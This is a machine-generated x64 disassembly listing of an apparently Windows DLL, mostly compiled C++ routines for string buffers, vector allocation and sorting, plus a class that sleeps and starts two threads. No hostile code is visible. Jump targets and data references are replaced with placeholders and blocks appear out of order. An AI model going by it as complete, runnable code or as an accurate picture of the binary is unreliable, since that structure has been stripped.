lea rax [ r8 - 0x1 ]
cmovbe rcx rdi
mov [ rbx + 0x20 ] rax
test rax rax
mov rax rdx
mov [ rbx + 0x18 ] rcx
jne r-xdata
mov rbx [ rsp + 0x50 ]
add rsp 0x40
pop rdi
retn
mov [ rbx + 0x18 ] rdi
sub_1800023b0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x40
mov rax rdx
mov rbp r9
mov rsi r8
sub rax rcx
mov rbx rdx
mov rdi rcx
sar rax 0x3
cmp rax 0x20
jle r-xdata
cmp rax 0x1
jle r-xdata
test rsi rsi
jle r-xdata
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x40
pop rdi
retn
xor r9d r9d
mov r8 rbp
mov rdx rbx
mov rcx rdi
call sub_180001610
cmp rax 0x20
jle r-xdata
lea rcx [ rsp + 0x30 ]
mov r9 rbp
mov r8 rbx
mov rdx rdi
call sub_180001bf0
mov r10 [ rsp + 0x38 ]
mov rax rsi
cqo
mov rcx rbx
mov r9 rbp
sub rax rdx
sub rcx r10
sar rax 0x1
and rcx 0xfffffffffffffff8
mov rsi rax
cqo
sub rax rdx
mov rdx [ rsp + 0x30 ]
sar rax 0x1
add rsi rax
mov rax rdx
sub rax rdi
mov r8 rsi
and rax 0xfffffffffffffff8
cmp rax rcx
jge r-xdata
mov rax rbx
sub rax rdi
and rax 0xfffffffffffffff8
cmp rax 0x8
jle r-xdata
mov rdx rbx
mov rcx r10
call sub_1800023b0
mov rbx [ rsp + 0x30 ]
mov rcx rdi
call sub_1800023b0
mov rdi [ rsp + 0x38 ]
jmp r-xdata
mov r8 rbp
mov rdx rbx
mov rcx rdi
call sub_180001df0
jmp r-xdata
xor r9d r9d
mov r8 rbp
mov rdx rbx
mov rcx rdi
mov [ rsp + 0x20 ] 0x0
call sub_1800014f0
mov rax rbx
sub rax rdi
sar rax 0x3
cmp rax 0x20
jg r-xdata
sub_1800024f0
push rbx
sub rsp 0x20
cmp [ rdx + 0x18 ] 0x8
mov rbx rdx
jb r-xdata
xor eax eax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rax
mov [ rbx ] ax
add rsp 0x20
pop rbx
retn
mov rcx [ rdx ]
call j_sub_18001c80c
sub_180002520
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x58 ] rsi
mov rbx rdx
mov rdi rcx
lea rax [ r--data ]
mov [ rcx ] rax
xor esi esi
mov [ rcx + 0x10 ] rsi
mov [ rcx + 0x18 ] rsi
mov [ rcx + 0x20 ] rsi
add rcx 0x38
lea rdx [ rsp + 0x48 ]
call sub_180001960
mov [ rdi + 0x30 ] rsi
mov [ rdi + 0x8 ] rbx
mov [ rdi + 0x70 ] rsi
mov [ rdi + 0x68 ] rsi
mov rax rdi
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
sub_180002590
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
push rbx
push rdi
sub rsp 0x48
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov rbx r8
mov [ rsp + 0x20 ] rbx
xor edi edi
nop [ rax ] eax
mov rax rbx
add rsp 0x48
pop rdi
pop rbx
retn
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] rbx
test rbx rbx
je r-xdata
add rbx 0x28
mov [ rsp + 0x70 ] rbx
add rcx 0x28
mov [ rsp + 0x60 ] rcx
jmp r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rdi
mov [ rbx ] di
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rcx
mov rcx rbx
call sub_180001ac0
mov rdx [ rsp + 0x68 ]
mov rcx [ rsp + 0x60 ]
cmp rcx rdx
je r-xdata
sub_180002620
cmp rdx r8
je r-xdata
retn
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov [ rsp + 0x30 ] rsi
mov rdi r8
mov rbx rdx
xor esi esi
nop [ rax ] eax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rsi
mov [ rbx ] si
add rbx 0x28
cmp rbx rdi
jne r-xdata
mov rcx [ rbx ]
call j_sub_18001c80c
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rsi [ rsp + 0x30 ]
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
sub_180002680
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rdi
sub rsp 0x20
mov rbx [ rcx ]
xor ebp ebp
mov rdi rcx
test rbx rbx
je r-xdata
mov rbx [ rsp + 0x38 ]
mov [ rdi ] rbp
mov [ rdi + 0x8 ] rbp
mov [ rdi + 0x10 ] rbp
mov rbp [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov [ rsp + 0x30 ] rsi
mov rsi [ rcx + 0x8 ]
cmp rbx rsi
je r-xdata
mov rcx [ rdi ]
call j_sub_18001c80c
mov rsi [ rsp + 0x30 ]
nop [ rax + rax ] ax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rbp
mov [ rbx ] bp
add rbx 0x28
cmp rbx rsi
jne r-xdata
mov rcx [ rbx ]
call j_sub_18001c80c
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
sub_180002700
mov [ rsp + 0x8 ] rcx
push r12
sub rsp 0x40
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ rsp + 0x58 ] rbx
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x68 ] rdi
mov r12 rdx
mov rbx rcx
xor ecx ecx
mov [ rbx ] rcx
mov [ rbx + 0x8 ] rcx
mov [ rbx + 0x10 ] rcx
mov r8 [ rdx + 0x8 ]
sub r8 [ rdx ]
mov rax 0x6666666666666667
imul r8
mov rdi rdx
sar rdi 0x4
mov rax rdi
shr rax 0x3f
add rdi rax
mov [ rbx ] rcx
mov [ rbx + 0x8 ] rcx
mov [ rbx + 0x10 ] rcx
je r-xdata
mov rax rbx
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
mov rax 0x666666666666666
cmp rdi rax
jbe r-xdata
mov rdx rdi
lea rcx [ rbx + 0x18 ]
call sub_1800031a0
mov r8 rax
mov [ rbx ] rax
mov [ rbx + 0x8 ] rax
lea rax [ rdi + rdi * 4 ]
lea rcx [ r8 + rax * 8 ]
mov [ rbx + 0x10 ] rcx
movzx eax [ rsp + 0x50 ]
mov [ rsp + 0x20 ] al
lea r9 [ rbx + 0x18 ]
mov rdx [ r12 + 0x8 ]
mov rcx [ r12 ]
call sub_180002590
mov [ rbx + 0x8 ] rax
lea rcx [ r--data ]
call sub_18001c17c
sub_180002800
push rdi
sub rsp 0x80
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x90 ] rbx
mov rdi rdx
mov rax [ rcx ]
lea rdx [ rsp + 0x50 ]
call [ rax + 0x30 ]
mov rbx rax
mov r8 [ rdi ]
lea rdx [ rsp + 0x28 ]
mov rcx rdi
call [ r8 + 0x30 ]
movzx ecx [ rax + 0x2 ]
cmp [ rbx + 0x2 ] cl
setb bl
lea rcx [ rsp + 0x30 ]
call sub_180002680
nop
lea rcx [ rsp + 0x58 ]
call sub_180002680
movzx eax bl
mov rbx [ rsp + 0x90 ]
add rsp 0x80
pop rdi
retn
sub_180002870
mov rax rsp
push rsi
push rdi
push r12
sub rsp 0x80
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x18 ] rbp
mov rbp rdx
mov rsi rcx
xor edi edi
mov [ rax + 0x10 ] edi
xor r12b r12b
mov rax [ rdx ]
lea rdx [ rsp + 0x28 ]
mov rcx rbp
call [ rax + 0x30 ]
mov r11 rax
cmp [ rax ] di
jne r-xdata
xor al al
mov rax [ rax + 0x10 ]
cmp [ r11 + 0x8 ] rax
jne r-xdata
mov rcx [ rsi + 0x30 ]
test rcx rcx
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
jmp r-xdata
xor bl bl
mov rax [ rcx ]
lea rdx [ rsp + 0x50 ]
call [ rax + 0x30 ]
mov rbx rax
mov [ rsp + 0xa8 ] 0x1
mov rax [ rbp ]
lea rdx [ rsp + 0x28 ]
mov rcx rbp
call [ rax + 0x30 ]
mov edi 0x3
movzx eax [ rax ]
cmp [ rbx ] ax
je r-xdata
lea r11 [ rsp + 0x80 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x30 ]
mov rsp r11
pop r12
pop rdi
pop rsi
retn
cmp al 0x1
sete bl
lea rcx [ rsp + 0x30 ]
call sub_180002680
test bl bl
je r-xdata
test dil 0x1
je r-xdata
and edi 0xfffffffd
lea rcx [ rsp + 0x30 ]
call sub_180002680
nop
mov bl 0x1
jmp r-xdata
mov rcx [ rsi + 0x30 ]
test bl bl
je r-xdata
and edi 0xfffffffe
lea rcx [ rsp + 0x58 ]
call sub_180002680
test dil 0x2
je r-xdata
test rcx rcx
je r-xdata
mov rax [ rcx ]
call [ rax + 0x20 ]
jmp r-xdata
xor bl bl
mov rax [ rcx ]
lea rdx [ rsp + 0x28 ]
call [ rax + 0x30 ]
mov rbx rax
or edi 0x4
mov [ rsp + 0xa8 ] edi
mov rax [ rbp ]
lea rdx [ rsp + 0x50 ]
mov rcx rbp
call [ rax + 0x30 ]
or edi 0x8
movzx eax [ rax ]
cmp [ rbx ] ax
jne r-xdata
mov rax [ rbp ]
mov rcx rbp
call [ rax + 0x18 ]
test al al
jne r-xdata
test dil 0x4
je r-xdata
and edi 0xfffffff7
lea rcx [ rsp + 0x58 ]
call sub_180002680
nop
mov bl 0x1
jmp r-xdata
mov [ rsi + 0x30 ] rbp
mov r12b 0x1
mov rcx [ rsi + 0x30 ]
mov rax [ rcx ]
call [ rax + 0x18 ]
jmp r-xdata
test bl bl
jne r-xdata
lea rcx [ rsp + 0x30 ]
call sub_180002680
test dil 0x8
je r-xdata
mov rcx [ rsi + 0x8 ]
mov r8 [ rcx ]
xor edx edx
call [ r8 + 0x18 ]
movzx eax r12b
sub_180002a10
mov rax rsp
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x90
mov [ rsp + 0x70 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov rsi rcx
mov rcx [ rcx + 0x8 ]
mov rax [ rcx ]
call [ rax + 0x10 ]
mov r14d eax
mov rcx [ rsi + 0x8 ]
mov rdx [ rcx ]
call [ rdx + 0x10 ]
mov r15d eax
xor r12d r12d
mov edi r12d
mov rbx 0x6666666666666667
mov rcx [ rsi + 0x30 ]
mov rax [ rcx ]
call [ rax + 0x28 ]
test al al
jne r-xdata
mov rcx [ rsi + 0x8 ]
mov rax [ rcx ]
call [ rax + 0x10 ]
mov r15d eax
mov r14d eax
lea rcx [ rsi + 0x38 ]
lea rdx [ rsp + 0xc0 ]
call sub_180010bc0
jmp r-xdata
mov rdi r12
jmp r-xdata
mov rcx [ rsi + 0x30 ]
mov rax [ rcx ]
lea rdx [ rsp + 0x20 ]
call [ rax + 0x30 ]
mov r11 rax
lea rcx [ rax + 0x8 ]
mov rdx [ rcx + 0x8 ]
sub rdx [ rcx ]
mov rax rbx
imul rdx
mov rbx rdx
sar rbx 0x4
mov r8 rbx
shr r8 0x3f
add rbx r8
movzx eax [ r11 + 0x3 ]
imul rbx rax
call sub_180002680
mov r11 rdi
inc rdi
cmp r11 rbx
jne r-xdata
mov rcx [ rsi + 0x8 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
mov rcx [ rsi + 0x8 ]
cmp r14d eax
mov rax [ rcx ]
jae r-xdata
mov rbx 0x6666666666666667
mov rax [ rsi + 0x18 ]
sub rax [ rsi + 0x10 ]
sar rax 0x3
cmp rax 0x1
jbe r-xdata
call [ rax + 0x8 ]
mov r14d eax
jmp r-xdata
call [ rax + 0x10 ]
add r15d eax
mov r14d r15d
imul r14d r15d
jmp r-xdata
xor r12b r12b
mov ecx r14d
call [ Sleep@IAT ]
mov rcx [ rsi + 0x8 ]
mov rdx [ rcx ]
call [ rdx ]
mov rcx [ rsi + 0x30 ]
mov r8 [ rcx ]
mov rdx rax
call [ r8 + 0x10 ]
mov [ rsp + 0xc0 ] rax
test rax rax
je r-xdata
xor r12d r12d
mov edi r12d
jmp r-xdata
mov rax [ rsi + 0x10 ]
mov rbx [ rax + rcx * 8 ]
mov rcx [ rsi + 0x30 ]
mov rax [ rcx ]
lea rdx [ rsp + 0x20 ]
call [ rax + 0x30 ]
mov rdi rax
mov r8 [ rbx ]
lea rdx [ rsp + 0x48 ]
mov rcx rbx
call [ r8 + 0x30 ]
movzx ecx [ rdi ]
cmp [ rax ] cx
sete r13b
lea rcx [ rsp + 0x50 ]
mov rbx [ rsp + 0x50 ]
test rbx rbx
je r-xdata
xor eax eax
mov [ rcx ] rax
mov [ rcx + 0x8 ] rax
mov [ rcx + 0x10 ] rax
lea rcx [ rsp + 0x28 ]
mov rbx [ rsp + 0x28 ]
test rbx rbx
je r-xdata
mov rdi [ rsp + 0x58 ]
xor eax eax
mov [ rcx ] rax
mov [ rcx + 0x8 ] rax
mov [ rcx + 0x10 ] rax
test r13b r13b
je r-xdata
mov rdi [ rsp + 0x30 ]
lea rcx [ rsp + 0x50 ]
mov rcx [ rcx ]
call j_sub_18001c80c
lea rcx [ rsp + 0x50 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
inc r12b
jmp r-xdata
mov rcx [ rsi + 0x18 ]
sub rcx [ rsi + 0x10 ]
sar rcx 0x3
movzx eax r12b
inc eax
cdqe
xor edx edx
div rcx
movzx eax dl
mov rdx [ rsi + 0x10 ]
mov rdx [ rdx + rax * 8 ]
mov rcx rsi
call sub_180002870
jmp r-xdata
lea rcx [ rsp + 0x28 ]
mov rcx [ rcx ]
call j_sub_18001c80c
xor eax eax
lea rcx [ rsp + 0x28 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rax
mov [ rbx ] ax
add rbx 0x28
jmp r-xdata
mov rcx [ rbx ]
call j_sub_18001c80c
xor eax eax
movzx ecx r12b
mov rax [ rsi + 0x18 ]
sub rax [ rsi + 0x10 ]
sar rax 0x3
cmp rcx rax
jae r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rax
mov [ rbx ] ax
add rbx 0x28
jmp r-xdata
mov rcx [ rbx ]
call j_sub_18001c80c
xor eax eax
cmp rbx rdi
je r-xdata
cmp rbx rdi
je r-xdata
sub_180002ce0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x50
mov rax [ rcx + 0x18 ]
xor bpl bpl
movzx r13d dx
sub rax [ rcx + 0x10 ]
mov rsi rcx
sar rax 0x3
test rax rax
je r-xdata
xor al al
xor r14d r14d
mov edx r14d
nop [ rax + rax ] ax
test r12b r12b
jne r-xdata
mov rdi [ rsp + 0x30 ]
cmp rbx rdi
je r-xdata
mov rdx [ rsi + 0x10 ]
movzx eax bpl
mov rcx rsi
mov rdx [ rdx + rax * 8 ]
call sub_180002870
mov al 0x1
jmp r-xdata
mov rax [ rsi + 0x18 ]
inc bpl
sub rax [ rsi + 0x10 ]
movzx edx bpl
sar rax 0x3
cmp rdx rax
jb r-xdata
mov rcx rbx
call j_sub_18001c80c
nop
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rsi [ r11 + 0x30 ]
mov rdi [ r11 + 0x38 ]
mov rsp r11
pop r14
pop r13
pop r12
retn
mov rax [ rsi + 0x10 ]
mov rcx [ rax + rdx * 8 ]
lea rdx [ rsp + 0x20 ]
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rbx [ rsp + 0x28 ]
cmp [ rax ] r13w
sete r12b
test rbx rbx
je r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r14
mov [ rbx ] r14w
add rbx 0x28
cmp rbx rdi
jne r-xdata
mov rcx [ rbx ]
call j_sub_18001c80c
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rbx [ rsp + 0x28 ]
sub_180002df0
mov rax rsp
mov [ rax + 0x10 ] rdx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x50
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
mov r12 rdx
mov rsi rcx
xor r14b r14b
xor bpl bpl
mov rax [ rcx + 0x18 ]
sub rax [ rcx + 0x10 ]
sar rax 0x3
xor r15d r15d
test rax rax
je r-xdata
mov rdx [ rsi + 0x18 ]
mov rcx [ rsi + 0x10 ]
mov r8 rdx
sub r8 rcx
sar r8 0x3
lea r9 [ sub_180002800 ]
call sub_1800023b0
nop
mov rbx [ r12 + 0x8 ]
test rbx rbx
je r-xdata
mov ecx r15d
mov [ r12 + 0x8 ] r15
mov [ r12 + 0x10 ] r15
mov [ r12 + 0x18 ] r15
movzx eax r14b
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rdi [ r12 + 0x10 ]
cmp rbx rdi
je r-xdata
test r13b r13b
jne r-xdata
mov rdi [ rsp + 0x38 ]
cmp rbx rdi
je r-xdata
mov rcx [ r12 + 0x8 ]
call j_sub_18001c80c
nop
movzx ecx bpl
mov rax [ rsi + 0x10 ]
mov rbx [ rax + rcx * 8 ]
movzx eax [ r12 ]
mov [ rsp + 0x28 ] ax
movzx eax [ r12 + 0x2 ]
mov [ rsp + 0x2a ] al
movzx eax [ r12 + 0x3 ]
mov [ rsp + 0x2b ] al
lea rdx [ r12 + 0x8 ]
lea rcx [ rsp + 0x30 ]
call sub_180002700
mov r11 [ rbx ]
lea rdx [ rsp + 0x28 ]
mov rcx rbx
call [ r11 + 0x38 ]
movzx r14d al
inc bpl
movzx ecx bpl
mov rax [ rsi + 0x18 ]
sub rax [ rsi + 0x10 ]
sar rax 0x3
cmp rcx rax
jb r-xdata
mov rcx rbx
call j_sub_18001c80c
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r15
mov [ rbx ] r15w
add rbx 0x28
cmp rbx rdi
jne r-xdata
mov rcx [ rbx ]
call j_sub_18001c80c
mov rax [ rsi + 0x10 ]
mov rcx [ rax + rcx * 8 ]
mov rax [ rcx ]
lea rdx [ rsp + 0x28 ]
call [ rax + 0x30 ]
mov r11 rax
movzx eax [ r12 ]
cmp [ r11 ] ax
sete r13b
mov rbx [ rsp + 0x30 ]
test rbx rbx
je r-xdata
jmp r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r15
mov [ rbx ] r15w
add rbx 0x28
cmp rbx rdi
jne r-xdata
mov rcx [ rbx ]
call j_sub_18001c80c
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rbx [ rsp + 0x30 ]
sub_180002fc0
push rbx
sub rsp 0x30
mov rax [ rcx + 0x18 ]
mov rbx rcx
sub rax [ rcx + 0x10 ]
test rax 0xfffffffffffffff8
je r-xdata
add rsp 0x30
pop rbx
retn
mov rdx [ rcx + 0x10 ]
mov rdx [ rdx ]
call sub_180002870
test al al
je r-xdata
lea rax [ rsp + 0x40 ]
lea r8 [ sub_1800010b0 ]
mov r9 rbx
mov [ rsp + 0x28 ] rax
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] 0x0
call [ CreateThread@IAT ]
mov [ rbx + 0x70 ] rax
test rax rax
je r-xdata
lea rax [ rsp + 0x48 ]
lea r8 [ sub_180001090 ]
mov r9 rbx
mov [ rsp + 0x28 ] rax
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] 0x0
call [ CreateThread@IAT ]
mov [ rbx + 0x68 ] rax
sub_1800030f0
push rbx
sub rsp 0x20
mov rbx [ rcx + 0x10 ]
test rbx rbx
je r-xdata
add rsp 0x20
pop rbx
retn
mov rcx [ rbx + 0x18 ]
test rcx rcx
je r-xdata
mov rcx rbx
call j_sub_18001c80c
call sub_18001c80c
sub_180003140
mov rax [ rcx + 0x60 ]
mov r8 rcx
mov rcx [ rcx + 0x68 ]
cmp rax rcx
jne r-xdata
sub rcx rax
movzx eax [ r8 + 0x80 ]
xor edx edx
inc eax
sar rcx 0x3
cdqe
div rcx
mov rax [ r8 + 0x60 ]
movzx ecx dl
mov [ r8 + 0x80 ] dl
mov rax [ rax + rcx * 8 ]
retn
mov eax 0xffffffff
retn
sub_1800031a0
sub rsp 0x48
xor eax eax
test rdx rdx
je r-xdata
add rsp 0x48
retn
mov rax 0x666666666666666
cmp rdx rax
ja r-xdata
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x58 ] 0x0
call sub_18001c398
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_18001c8f0
int3
lea rcx [ rdx + rdx * 4 ]
shl rcx 0x3
call sub_18001c84c
test rax rax
jne r-xdata
sub_180003210
sub rsp 0x48
xor eax eax
test rdx rdx
je r-xdata
add rsp 0x48
retn
mov rax 0xfffffffffffffff
cmp rdx rax
ja r-xdata
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x58 ] 0x0
call sub_18001c398
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_18001c8f0
int3
shl rdx 0x4
mov rcx rdx
call sub_18001c84c
test rax rax
jne r-xdata
sub_180003280
sub rsp 0x48
xor eax eax
test rdx rdx
je r-xdata
add rsp 0x48
retn
cmp rdx 0xffffffffffffffff
ja r-xdata
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x58 ] 0x0
call sub_18001c398
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_18001c8f0
int3
mov rcx rdx
call sub_18001c84c
test rax rax
jne r-xdata
sub_1800032e0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi r8
mov r8 [ rcx + 0x10 ]
mov r9 rdx
mov rbx rcx
cmp r8 rdx
jae r-xdata
sub r8 rdx
cmp r8 rdi
cmovb rdi r8
test rdi rdi
je r-xdata
lea rcx [ r--data ]
call sub_18001c1d8
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rax [ rcx + 0x18 ]
cmp rax 0x10
jb r-xdata
mov rax rbx
mov rcx [ rcx ]
mov rax [ rbx ]
jmp r-xdata
mov rax rbx
mov [ rbx + r11 ] 0x0
mov rax [ rbx ]
mov [ rax + r11 ] 0x0
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
add rdx rcx
lea rcx [ rax + r9 ]
sub r8 rdi
add rdx rdi
call sub_18001c4a0
mov r11 [ rbx + 0x10 ]
sub r11 rdi
cmp [ rbx + 0x18 ] 0x10
mov [ rbx + 0x10 ] r11
jb r-xdata
sub_180003380
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
push rbx
push rsi
push rdi
push r12
sub rsp 0x48
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov r12 r8
mov rbx rcx
mov rdi rdx
or rdi 0xf
cmp rdi 0xfffffffffffffffe
jbe r-xdata
mov r8 [ rcx + 0x18 ]
mov rcx r8
shr rcx 0x1
mov rax 0xaaaaaaaaaaaaaaab
mul rdi
shr rdx 0x1
cmp rcx rdx
jbe r-xdata
mov rdi rdx
jmp r-xdata
lea rcx [ rdi + 0x1 ]
xor esi esi
test rcx rcx
je r-xdata
mov rdi 0xfffffffffffffffe
mov rax rdi
sub rax rcx
cmp r8 rax
ja r-xdata
jmp r-xdata
cmp rcx 0xffffffffffffffff
ja r-xdata
lea rdi [ rcx + r8 ]
test r12 r12
je r-xdata
mov [ rsp + 0x88 ] 0x0
lea rdx [ rsp + 0x88 ]
lea rcx [ rsp + 0x28 ]
call sub_18001c398
lea rax [ r--data ]
mov [ rsp + 0x28 ] rax
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_18001c8f0
nop
call sub_18001c84c
mov rsi rax
test rax rax
jne r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov [ rbx ] 0x0
mov [ rbx ] rsi
mov [ rbx + 0x18 ] rdi
mov [ rbx + 0x10 ] r12
cmp rdi 0x10
cmovae rbx rsi
mov [ rbx + r12 ] 0x0
add rsp 0x48
pop r12
pop rdi
pop rsi
pop rbx
retn
mov rcx [ rbx ]
call j_sub_18001c80c
mov rdx rbx
mov rdx [ rbx ]
jmp r-xdata
mov r8 r12
mov rcx rsi
call sub_18001c4a0
sub_1800034c0
mov [ rsp + 0x10 ] rdx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x40 ] rbx
mov rbx rdx
mov rdi rcx
mov ecx 0x18
call sub_18001c84c
test rax rax
je r-xdata
mov r8 rax
mov rdx rbx
mov rcx rdi
call sub_1800011a0
nop
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
mov [ rax + 0x8 ] 0x1
mov [ rax + 0xc ] 0x1
lea rcx [ r--data ]
mov [ rax ] rcx
mov [ rax + 0x10 ] rbx
sub_180003530
mov [ rsp + 0x10 ] rbx
push rsi
mov r9 rdx
mov r10 r8
mov rbx rcx
sub r9 rcx
sub r10 rcx
mov rsi r8
sar r9 0x3
sar r10 0x3
mov r11 r10
mov rcx r9
test r9 r9
je r-xdata
cmp r11 r10
jge r-xdata
nop [ rax + rax ] eax
mov rbx [ rsp + 0x18 ]
pop rsi
retn
test r11 r11
jle r-xdata
mov rax r11
mov r11 rcx
cqo
idiv rcx
mov rcx rdx
test rdx rdx
jne r-xdata
mov [ rsp + 0x10 ] rdi
lea r10 [ r9 * 8 ]
lea r8 [ rbx + r11 * 8 ]
nop
mov rax r9
sub rax rcx
lea rdx [ rbx + rax * 8 ]
add rdx r10
jmp r-xdata
mov rcx [ rdi ]
mov rax [ rdx ]
mov [ rdi ] rax
mov [ rdx ] rcx
mov rcx rsi
sub rcx rdx
mov rdi rdx
sar rcx 0x3
cmp r9 rcx
jge r-xdata
dec r11
sub r8 0x8
test r11 r11
jg r-xdata
cmp rdx r8
jne r-xdata
lea rdx [ r8 + r10 ]
mov rdi r8
cmp rdx rsi
cmove rdx rbx
nop
mov rdi [ rsp + 0x10 ]
sub_1800035f0
push rbx
sub rsp 0x20
cmp [ rcx + 0x18 ] 0x10
mov rbx rcx
jb r-xdata
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] 0x0
mov [ rbx ] 0x0
add rsp 0x20
pop rbx
retn
mov rcx [ rcx ]
call j_sub_18001c80c
sub_180003650
mov [ rsp + 0x20 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
cmp rdx 0xfffffffffffffffe
jbe r-xdata
mov rax [ rcx + 0x18 ]
mov [ rsp + 0x38 ] rsi
xor esi esi
cmp rax rdx
jae r-xdata
lea rcx [ r--data ]
call sub_18001c17c
test r8b r8b
je r-xdata
mov r8 [ rcx + 0x10 ]
call sub_180003380
jmp r-xdata
test rdx rdx
jne r-xdata
cmp rdx 0x10
jae r-xdata
mov rsi [ rsp + 0x38 ]
mov rbx [ rsp + 0x48 ]
test rdi rdi
setne al
add rsp 0x20
pop rdi
retn
mov [ rcx + 0x10 ] rsi
cmp rax 0x10
jb r-xdata
mov [ rsp + 0x30 ] rbp
mov rbp [ rcx + 0x10 ]
cmp rdx rbp
cmovb rbp rdx
cmp rax 0x10
jb r-xdata
mov [ rbx ] sil
mov rbx [ rcx ]
mov [ rbx + 0x10 ] rbp
mov [ rbx + 0x18 ] 0xf
mov [ rbx + rbp ] sil
mov rbp [ rsp + 0x30 ]
jmp r-xdata
mov [ rsp + 0x40 ] r12
mov r12 [ rcx ]
test rbp rbp
je r-xdata
mov rcx r12
call j_sub_18001c80c
mov r12 [ rsp + 0x40 ]
mov r8 rbp
mov rdx r12
call sub_18001c4a0
sub_180003720
push r12
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x50 ] rsi
mov [ rsp + 0x58 ] rdi
mov rdi rdx
mov rbx rcx
mov rax 0x1fffffffffffffff
cmp rdx rax
jbe r-xdata
mov rax [ rcx + 0x10 ]
sub rax [ rcx ]
sar rax 0x3
cmp rax rdx
jae r-xdata
lea rcx [ r--data ]
call sub_18001c17c
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x30
pop r12
retn
add rcx 0x18
call sub_180005340
mov rsi rax
mov [ rsp + 0x48 ] rax
